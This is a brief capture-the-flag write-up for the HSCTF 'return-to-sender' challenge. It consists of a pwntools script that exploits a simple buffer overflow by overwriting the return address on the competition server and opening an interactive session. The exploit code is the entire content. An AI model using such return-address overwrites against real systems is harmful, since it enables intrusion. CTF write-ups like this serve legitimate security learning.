# HSCTF - return-to-sender --

## Desc

Simple buffer overflow

## Sploit
```python
#!/usr/bin/env python2.7
from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('pwn.hsctf.com', 1234)
payload='A'*10 + 'B'*8 + 'C'*2 + '\xb6\x91\x04\x08'
r.send(payload)
r.interactive()
```
